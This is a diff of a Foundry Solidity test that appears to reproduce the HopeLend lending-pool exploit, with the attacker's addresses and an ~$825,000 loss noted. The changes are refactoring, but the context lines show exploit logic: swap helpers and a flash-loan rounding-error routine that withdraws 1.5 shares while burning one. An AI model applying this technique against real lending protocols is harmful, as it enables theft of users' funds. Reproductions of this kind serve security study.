@@ -1,7 +1,5 @@
 import "forge-std/Test.sol";
 
-import "./../interface.sol";
-
 // @KeyInfo - Total Lost : ~$825000 US$
 // Attacker : https://etherscan.io/address/0xA8Bbb3742f299B183190a9B079f1C0db8924145b
 // Attack Contract : https://etherscan.io/address/0xc74b72bbf904bac9fac880303922fc76a69f0bb4
@@ -30,13 +28,8 @@ interface IHopeLendPool {
 
     function withdraw(address asset, uint256 amount, address to) external returns (uint256);
 
-    function borrow(
-        address asset,
-        uint256 amount,
-        uint256 interestRateMode,
-        uint16 referralCode,
-        address onBehalfOf
-    ) external;
+    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
+        external;
 
 }
 
@@ -58,7 +51,7 @@ contract ContractTest is Test {
 
     IUniswapV2Router UniRouter02 = IUniswapV2Router(payable(0x219Bd2d1449F3813c01204EE455D11B41D5051e9));
 
-    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    IUniswapV3Router Router = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
 
     uint256 index = 0;
 
@@ -170,7 +163,7 @@ contract ContractTest is Test {
 
     function USDTToUSDC() internal {
         address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(Router), type(uint256).max));
-        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory _Params = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(USDT),
             tokenOut: address(USDC),
             fee: 500,
@@ -184,7 +177,7 @@ contract ContractTest is Test {
     }
 
     function USDCToWBTC() internal {
-        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory _Params = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(USDC),
             tokenOut: address(WBTC),
             fee: 500,
@@ -198,7 +191,7 @@ contract ContractTest is Test {
     }
 
     function WBTCToWETH() internal {
-        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
+        IUniswapV3Router.ExactInputSingleParams memory _Params = IUniswapV3Router.ExactInputSingleParams({
             tokenIn: address(WBTC),
             tokenOut: address(WETH),
             fee: 500,
@@ -212,11 +205,11 @@ contract ContractTest is Test {
     }
 
     function WithdrawAllWBTC() internal {
-        uint256 premiumPerFlashloan = 2000 * 1e8 * 9 / 10_000; // 0.09% flashlaon fee
-        premiumPerFlashloan -= (premiumPerFlashloan * 30 / 100); // 30% protocol fee
+        uint256 premiumPerFlashloan = (2000 * 1e8 * 9) / 10_000; // 0.09% flashlaon fee
+        premiumPerFlashloan -= ((premiumPerFlashloan * 30) / 100); // 30% protocol fee
         uint256 nextLiquidityIndex = premiumPerFlashloan * 60 + 1; // 60 times flashloan
         uint256 depositAmount = nextLiquidityIndex; // Use a rounding error greater than 0.5 for upward rounding and less than downward rounding
-        uint256 withdrawAmount = nextLiquidityIndex * 3 / 2 - 1; // withdraw 1.5 share of asset, but only burn 1 share throungh rounding error
+        uint256 withdrawAmount = (nextLiquidityIndex * 3) / 2 - 1; // withdraw 1.5 share of asset, but only burn 1 share throungh rounding error
         uint256 profitPerDAW = withdrawAmount - depositAmount; // profit per deposit and withdraw process
 
         console.log("premiumPerFlashloan", premiumPerFlashloan);
